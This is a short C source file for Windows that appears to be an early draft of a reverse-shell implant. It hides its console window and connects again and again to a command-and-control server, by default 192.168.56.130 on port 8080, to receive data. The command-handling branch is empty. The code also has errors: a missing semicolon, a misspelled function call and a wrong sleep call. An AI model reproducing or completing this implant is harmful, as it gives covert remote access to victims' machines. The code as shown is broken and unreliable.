#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell(char* C2Server, int C2Port) {
    while (true) {
        sleep(5000);
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0 ) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {

            }
        }
    }
}
int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port = atoi(argv[2]);
        RunShell(argv[1], port)
    }
    else {
        char host[] = "192.168.56.130";
        int port = 8080;
        RUnShell(host, port);
    }
    return 0;
}